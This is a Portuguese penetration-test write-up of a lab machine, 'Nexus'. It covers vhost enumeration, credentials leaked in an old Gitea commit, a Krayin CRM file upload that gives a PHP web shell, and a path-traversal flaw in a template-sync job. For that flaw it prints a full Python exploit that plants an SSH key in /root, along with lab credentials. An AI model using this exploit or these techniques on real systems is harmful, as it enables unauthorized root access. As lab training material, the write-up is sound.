# 🎯 Relatório de Invasão: Nexus

---

## 🛠️ Ferramentas & Scripts Utilizados
- nmap
- ssh-keygen
- exploit.py
---

## 🔍 1. Reconhecimento & Mapeamento

### Scan de Portas (Nmap)

> [!example] Output do Nmap com -sC e -sV
> 

![[Pasted image 20261109140433.png]]

> [!info] Análise do Reconhecimento
>

---

## 🌐 2. Enumeração Web & VHOSTs

> [!quote] Dados e reconhecimento
>
### Ffuf
![[Pasted image 20261109141558.png]]

### Gobuster
![[Pasted image 20261109141635.png]]
Temos dois vhosts válidos .
git.nexus.htb
billing.nexus.htb

### Exploração manual 
#### nexus.htb
![[Pasted image 20261109140740.png]]
![[Pasted image 20261109140812.png]]
 De restante não achei mais nada nessa página e nem achei nada no ffuf procurando por diretórios e arquivos.

#### git.nexus.htb
Nesse vhost vemos a execução do gitea , no gitea usei o ffuf e achei o usuário admin onde vemos no repositório dele que ele subiu o .env.
![[Pasted image 20261109142332.png]]
![[Pasted image 20261109142421.png]]
Aqui vemos credenciais como username e password do IMAP ,username do DB e algumas outras coisas. Porém não tem nenhuma password . Mas ao olhar os commits vemos um commit antigo que ao clicarmos nele vemos que a senha estava no .env . 
![[Pasted image 20261109143332.png]]
![[Pasted image 20261109142923.png]]

Com essa senha tentei krayin e admin junto do domínio do email presente no env mas não obtive sucesso , com isso tentei o email que achei no nexus.htb com essa senha e loguei no billing.nexus.htb no krayin.

#### billing.nexus.htb
![[Pasted image 20261109150002.png]]

---

## ⚡ 3. Exploração & Acesso Inicial (Foothold)

>[!failure] Vulnerabilidade encontrada
>**Título**: CVE-2026-38526 no krayin crm
>**Risk Rating**: 9.9
>**Resumo**: O servidor alvo possuía krayin crm versão 2.2 que é vulnerável a essa CVE que permite que acessemos a rota de mail e façamos envio de uma imagem para ser enviada com o email , porém podemos enviar um arquivo php arbitrário e com isso ter um web shell.
>**Background(Contexto adicional)**:
>**Impacto**: Podemos sair do ambito do servidor web e ganhar shell como www-data , podendo assim exfiltrar dados , enumerar o servidor e executar ações em nome do www-data.
>**Conselhos e Remediações**: A versão do krayin deve ser atualizada para a mais recente para que seja evitado essas CVE's por versões antigas.
>**Detalhes Técnicos e Evidências**:
1. Primeiro acessamos a rota de email do krayin , clicamos em Compose Mail e colocamos para inserir imagem ou la em baixo e inserir arquivo.
![[Pasted image 20261109165550.png]]
2. Assim vamos pro burp e confirmamos o envio
![[Pasted image 20261109165721.png]]
3. Vemos na resposta a url onde está o shell.php, agora é só acessar.
![[Pasted image 20261109165817.png]]

>[!failure] Vulnerabilidade encontrada
>**Título**: Gitea Template Directory Transversal
>**Risk Rating**: 8.8
>**Resumo**: Como jones vemos que o systemd possui time trigger para um template gitea, nisso o binário que executado pelo service desse time trigger indica uma vulnerabilidade que permite que façamos mudanças em arquivos .obj para injetar arquivo que contém ../ para mudar de diretório , assim permitindo que saiamos do dir de nosso usuário e repositório e cheguemos no /root e insiramos uma chave authorizada para ssh.
>**Background(Contexto adicional)**:
>**Impacto**: Recebendo shell como root podemos executar , enumerar e exfiltrar qualquer coisa do servidor alvo.
>**Conselhos e Remediações**: O script personalizado faz junção com os.path.join , assim permitindo colocar ../ . Isso deve ser alterado para  safe_base = os.path.realpath(stage_path) target = os.path.realpath(os.path.join(safe_base, filepath)) , assim permitindo que o arquivo não faça join de forma insegura permitindo ../ .
>**Detalhes Técnicos e Evidências**:
1. Criamos um repo como jones 
![[Pasted image 20261109171017.png]]
![[Pasted image 20261109171023.png]]
2. Criamos a chave ssh que iremos colocar para o root.
```
ssh-keygen -t ed25519 -f /tmp/.k -N ''
``` 
3. Executamos esses comandos a baixo.
``` 
cd /tmp
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/cron.git
cd cron
touch README.md
``` 
4. Depois criamos um arquivo exploit.py dentro de cron.
``` 
# build.py
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time
def write_obj(data,t):
h=("%s %d"%(t,len(data))).encode()+b"\x00"
s=h+data
sha=hashlib.sha1(s).hexdigest()
d=os.path.join(".git","objects",sha[:2])
os.makedirs(d,exist_ok=True)
p=os.path.join(d,sha[2:])
if not os.path.exists(p):
open(p,"wb").write(zlib.compress(s))
return sha
def entry(mode,name,sha):
return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
if not os.path.isdir(".git"):
print("Run inside git repo");sys.exit(1)
r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
if r.returncode!=0:
print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
``` 
5. Depois disso executamos com o seguinte comando .
```
python3 /tmp/cron/exploit.py
Done: 56568c587c75142dc364c36ca5c283c2f6d1ca22
git push -u origin main --force
``` 
6. Como jones iremos verificar se deu certo.
``` 
cat /var/log/template-sync.log

[2026-11-09 15:24:00] Template sync starting
[2026-11-09 15:24:00] Found 2 template repo(s)
[2026-11-09 15:24:00] Syncing template: jones/cron
[2026-11-09 15:24:00] synced: README.md
[2026-11-09 15:24:00] Syncing template: jones/cron
[2026-11-09 15:24:00] synced: README.md
[2026-11-09 15:24:00] synced: ../../../../../root/.ssh/authorized_keys
[2026-11-09 15:24:00] Template sync complete
```
7. Agora podemos fazer login como root com a chave.
```
ssh -i /tmp/.k root@nexus.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-106-generic x86_64)
root@nexus:~#
``` 

---

## 🔑 Tabela de Credenciais Capturadas

| Usuário               | Senha / Hash    |
| :-------------------- | :-------------- |
| krayin                | N27xh!!2ucY04   |
| laravel@krayincrm.com |                 |
| j.matthew@nexus.htb   | N27xh!!2ucY04   |
| jones                 | y27xb3ha!!74GbR |

---

## 📚 Considerações Técnicas & Cheat Sheet

> [!info] Lições Aprendidas
> 1. 
> 2. 